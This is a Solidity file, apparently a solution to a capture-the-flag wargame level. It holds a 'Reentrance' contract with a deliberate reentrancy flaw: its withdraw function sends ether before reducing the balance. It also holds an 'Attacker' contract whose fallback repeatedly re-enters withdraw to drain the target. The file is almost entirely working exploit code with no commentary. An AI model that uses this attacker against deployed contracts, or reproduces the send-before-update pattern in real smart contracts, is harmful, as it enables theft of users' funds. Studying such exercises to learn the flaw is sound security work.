// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';


contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attacker {

    Reentrance public target;
    uint public amount = 0.001 ether;

    constructor(address payable  _reentranceAddress) public {
        target = Reentrance(_reentranceAddress);
        
    }

    fallback() external payable {
        if(address(target).balance != 0) {
            target.withdraw(amount);
        }
    }

    function donateTarget() public  payable {
        target.donate{value: msg.value, gas: 4000000}(address(this));
    }
    function attack() public {
      target.withdraw(amount);
    }
}